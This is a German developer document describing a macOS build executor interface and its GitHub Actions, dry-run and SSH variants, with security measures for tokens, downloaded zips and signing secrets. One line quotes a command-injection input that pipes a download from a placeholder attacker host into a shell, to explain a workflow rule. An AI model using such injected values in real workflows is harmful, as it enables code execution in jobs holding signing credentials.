# macOS-Executor

## Das Interface

Alles, was einen Mac braucht, laeuft ueber `bb/executors/__init__.py`:

```python
class MacExecutor:
    name: str                  # steht im Manifest und im Audit-Log
    cost_resource: str         # was der Cost Guard pruefen soll
    produces_real_ipa: bool    # False heisst: das Ergebnis ist kein iOS-Build

    def availability(self) -> str:        # AVAILABLE | BUSY | OFFLINE
    def submit(self, job: MacJob) -> str
    def poll(self, handle: str) -> MacJobResult
    def cancel(self, handle: str) -> bool
    def fetch_artifact(self, handle, dest_dir) -> str | None
```

`MacJob` enthaelt Repository, Commit, Modus, Scheme, Bundle ID, Buildnummer,
Version und den **Namen** des Provisioning-Profils. Es enthaelt **keine
Secrets**: der Executor loest seine Zugangsdaten an seinem eigenen Ende auf.

## Die vier Implementierungen

### `none` - der Standard heute

Meldet immer `OFFLINE` und verweigert jeden Job mit einer Begruendung, die sagt,
was fehlt und welche Optionen es gibt. Das ist kein Platzhalter, sondern die
ehrliche Antwort: Sebastian hat keinen Mac und keinen freigegebenen Executor.

### `dryrun` - die Pipeline ohne Mac

Laeuft den kompletten Zustandsablauf durch, ohne Xcode. Jedes Ergebnis ist mit
`simulated` markiert, jedes Manifest mit `dry_run`, und jede Anzeige schreibt
`SUCCESS (DRY RUN - kein echter iOS-Build)`. Zaehlt nicht gegen das Build-Limit,
erzeugt keine IPA, wird nie fuer OTA freigegeben.

### `github` - der Vorschlag fuer den Pilot

Startet den Workflow `burgys-ios-build.yml` im App-Repo per
`workflow_dispatch`, verfolgt den Run und holt die IPA. Kostenlos fuer
oeffentliche Repos (`COST_MODEL.md`).

Beim Abholen des Artefakts gibt es zwei Fallen, die beide abgeraeumt sind:

- **Das Token darf nicht mitwandern.** GitHub antwortet auf den
  Download-Endpunkt mit einer 302 auf einen *anderen* Host (eine vorsignierte
  URL, die keine Zugangsdaten braucht). `urllib` wuerde der Umleitung folgen
  und den `Authorization`-Header brav mitschicken - also das Token an den
  Umleitungsempfaenger aushaendigen. Buergys Builds folgt der Umleitung
  deshalb selbst und laedt den Blob **ohne jede Zugangsdaten**. Ein Test
  prueft, dass am Blob-Host kein `Authorization` ankommt.
- **Das Zip kommt aus dem Netz.** Jeder Eintragsname wird geprueft
  (`..`, fuehrender `/`, Laufwerksbuchstaben), die entpackte Groesse und die
  Anzahl der Eintraege sind gedeckelt, und die IPA wird gegen die
  `.sha256`-Datei geprueft, die der Workflow daneben legt - das faengt einen
  abgebrochenen Download, bevor er als kaputte Signatur auffaellt.

Konfiguration in `config/projects.json`:

```json
"executor": "github",
"executor_config": {
  "repo": "sebastianbuergy-oss/thy-gnosis-ios",
  "workflow": "burgys-ios-build.yml",
  "visibility": "public",
  "runs_on": "macos-latest",
  "token_file": "C:\\Users\\<user>\\.burgys\\github_token"
}
```

`visibility` **und** `runs_on` sind Pflicht:

- Fehlt `visibility`, nimmt der Cost Guard `private` an und blockiert - lieber
  ein Build zu wenig als eine Rechnung zu viel.
- Fehlt `runs_on` oder steht das Label nicht auf der Allowlist
  (`COST_MODEL.md`), blockiert der Cost Guard ebenfalls. Ein Larger Runner
  kostet auch auf einem oeffentlichen Repository Geld, und ein Label, das
  Buergys Builds nicht kennt, koennte einer sein.

Das Token gehoert in eine Datei ausserhalb des Repositories und braucht nur
`actions: write` und `contents: read` auf genau diesem Repo.

**Einrichtung (Sebastians Entscheidung, nicht automatisch):**

1. `burgys-builds/templates/burgys-ios-build.yml` nach
   `.github/workflows/burgys-ios-build.yml` im App-Repo kopieren.
2. Im App-Repo eine **geschuetzte Umgebung** `ios-signing` anlegen
   (Settings > Environments) und dort *Required reviewers* auf Sebastian
   setzen. Der Workflow laeuft mit `environment: ios-signing`.
3. Die Signing-Secrets **an dieser Umgebung** hinterlegen, nicht am
   Repository: `BURGYS_CERT_P12_BASE64`, `BURGYS_CERT_PASSWORD`,
   `BURGYS_PROFILE_BASE64`.
4. Repository-Variablen: `BURGYS_TEAM_ID`, `BURGYS_BUNDLE_ID`.
5. Ersten Lauf von Hand in der Actions-Oberflaeche starten und zusehen.
6. Erst danach `executor: "github"` eintragen.

Warum Punkt 2 und 3 zusammengehoeren: das Repository ist **oeffentlich** und
der Job kommt an das Distribution-Zertifikat. Secrets an einer geschuetzten
Umgebung werden erst freigegeben, wenn ein Mensch den Lauf bestaetigt - das ist
genau die Freigabe aus Abschnitt 29 des Auftrags, nur an der Stelle
durchgesetzt, an der die Schluessel liegen. Secrets am Repository haetten diese
Schranke nicht.

Ein Distribution-Zertifikat als GitHub-Secret zu hinterlegen ist ueblich und
dafuer vorgesehen - Secrets erreichen keine Workflow-Laeufe aus Forks und
werden in Logs maskiert. Es bleibt trotzdem eine Entscheidung, die Sebastian
treffen muss, nicht Buergys Builds.

**Das Template und `${{ }}`**

Im Workflow steht kein einziger `${{ ... }}`-Ausdruck in einem `run:`-Block.
Alles geht ueber `env:` und wird als `"$VARIABLE"` gelesen. Der Grund ist
nicht Stil: ein Ausdruck wird von GitHub *vor* der Shell ersetzt, also wuerde
eine Eingabe wie `x"; curl angreifer|sh; #` ausgefuehrt - in einem Job, der das
Signing-Zertifikat und dessen Passwort in der Hand haelt. Ein erster Schritt
validiert ausserdem jede Eingabe gegen ein Muster, bevor sie irgendetwas
anfasst. Wer das Template aendert, muss diese Regel einhalten.

**Export-Methode**

Xcode 15.3 hat `ad-hoc` und `app-store` zugunsten von `release-testing` und
`app-store-connect` als veraltet markiert. Beide Schreibweisen werden derzeit
akzeptiert; das Template nutzt die alten und laesst sich ueber
`BURGYS_EXPORT_METHOD_ADHOC` / `BURGYS_EXPORT_METHOD_STORE` umstellen, ohne
den Workflow anzufassen. **Beim ersten echten Lauf darauf achten** - wenn
`xcodebuild -exportArchive` die Methode nicht kennt, ist das die Ursache.

### `local` - der spaetere Burgys-iOS-Runner

Fuer den eigenen Mac mini. SSH mit Schluessel, ein Shell-Script auf dem Mac,
Statusdateien als Rueckkanal. Jeder Wert geht als eigenes `argv`-Element, nichts
wird in einen Shell-String interpoliert.

Wenn der Mac mini kommt, aendert sich **nur diese Datei plus die Konfiguration**.
Queue, Cost Guard, Manifeste, Preflight, OTA und Dashboard bleiben, wie sie sind.
Das war der Zweck der Abstraktion.

## Zeitgrenze

`mac_job_timeout_minutes` (Standard 30) bricht einen haengenden Job ab, damit
keine Minuten weiterlaufen. Der abgebrochene Build wird `BLOCKED`, nicht
wiederholt.

## Einen eigenen Executor schreiben

`MacExecutor` ableiten, `@register` daraufsetzen, in
`bb/executors/__init__.py::_load_backends` importieren. `cost_resource` muss in
`bb/costguard.py::RESOURCES` stehen - sonst gilt er als kostenpflichtig und wird
blockiert.
